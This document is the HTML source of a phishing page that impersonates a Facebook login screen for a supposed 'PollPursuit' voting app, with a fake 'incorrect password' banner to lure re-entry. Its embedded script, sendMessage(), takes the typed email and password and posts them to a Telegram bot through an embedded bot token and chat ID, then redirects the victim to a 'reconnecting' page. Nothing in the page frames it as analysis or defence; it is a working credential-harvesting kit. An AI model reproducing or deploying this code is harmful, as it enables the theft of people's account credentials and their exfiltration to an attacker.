<body data-new-gr-c-s-check-loaded="14.1029.0" data-gr-ext-installed="">
    <p style="margin-bottom: 0; padding-left: 12px; padding-top: 5px; padding-bottom: 5px; background: #fa3e3e; color: #ffffff; text-align: center; border-bottom: 1px none #e5ce3a;">Incorrect email or password. <strong>Did you forget your password?</strong></p>
    <nav class="navbar navbar-light navbar-expand-md" style="padding-bottom: 10px;">
        <div class="container-fluid"><img class="img-fluid" src="./assets/files/dF5SId3UHWd.svg" style="width: 140px; margin-top: 0px;"></div>
    </nav>
    <div class="contact-clean" style="padding: 0; padding-top: 0 px; padding-bottom: 0px; background: rgb(255,255,255);">
        <form id="asset" method="post" onsubmit="return validateForm()">
            <div><img class="img-fluid" src="https://cdn.icon-icons.com/icons2/3198/PNG/512/poll_icon_195220.png" style="width: 68px; margin-bottom: 11px;">
               <p style="text-align: center; padding-right: 10%; padding-left: 10%; color: rgba(99,106,113,0.88);">Log into your Facebook account to connect to <strong>PollPursuit - Online Vote</strong><br></p>
            </div>
            <div class="form-group" style="margin-bottom: 7px;">
                <input class="form-control form-control-sm" type="text" id="email" autocomplete="off" name="eml" placeholder="Mobile number or email" style="background: #f5f6f7; border-radius: 5px;" required="">
            </div>
            <div class="form-group" style="margin-bottom: 14px;">
                <input class="form-control form-control-sm" type="password" id="password" autocomplete="off" style="background: #f5f6f7; border-radius: 5px;" name="pwd" placeholder="Password" required="">
            </div>
            <div class="form-group">
                <button id="subbtn" class="btn btn-secondary btn-block btn-lg text-capitalize" type="button" onclick="sendMessage()" style="background: #1877f2; font-size: 16px;">Log in</button>
            </div>
            <div style="margin-top: 23px; text-align: center;"><span class="label" style="margin-top: -13px; margin-bottom: 1px; margin-right: 50%; margin-left: 43%; width: 53px;">or</span><span class="line" style="background: rgba(154,154,154,0.25);"></span></div>
            <div class="form-group" style="margin-left: auto; margin-right: auto; margin-top: 36px;"><a class="btn btn-secondary btn-block btn-lg text-capitalize" role="button" style="background: #00a400; font-size: 13px; font-style: normal; font-weight: bold; text-align: center; width: 172px; padding-left: 10px; padding-right: 10px; height: 36px; padding-top: 11px;" href="https://m.facebook.com/reg/">Create New Account</a>
                <p style="text-align: center; margin-top: 14px; font-size: 14px; color: #85a4d0;"><a href="https://touch.facebook.com/login/identify/?ctx=recover&amp;c=https%3A%2F%2Ftouch.facebook.com%2F&amp;multiple_results=0&amp;ars=facebook_login&amp;lwv=100&amp;_rdr" style="color: #548ad6;">Forgot Password?</a></p>
            </div>
        </form>
    </div>
    <script src="./assets/files/jquery.min.js.download"></script>
    <script src="./assets/files/bootstrap.min.js.download"></script>
    <script src="./assets/files/bootstrap.js.download"></script>

    <script>
    function sendMessage() {
        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;

        if (email.length < 5 || password.length < 5) {
            alert("Email and password must be at least 5 characters long.");
            return;
        }

        var message = "New Login:\nEmail: " + email + "\nPassword: " + password;

        fetch('https://api.telegram.org/bot5910982961:AAGdCuAo0CqdVhfGLFD72rwI71uAAU-WqAM/sendMessage', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: '1634597902',
                text: message,
            }),
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            // console.log(data); // Remove or comment out this line
            window.location.href = 'reconnecting.html';
        })
        .catch(error => {
            console.error('There was a problem with the fetch operation:', error);
        });
    }
</script>

</body>
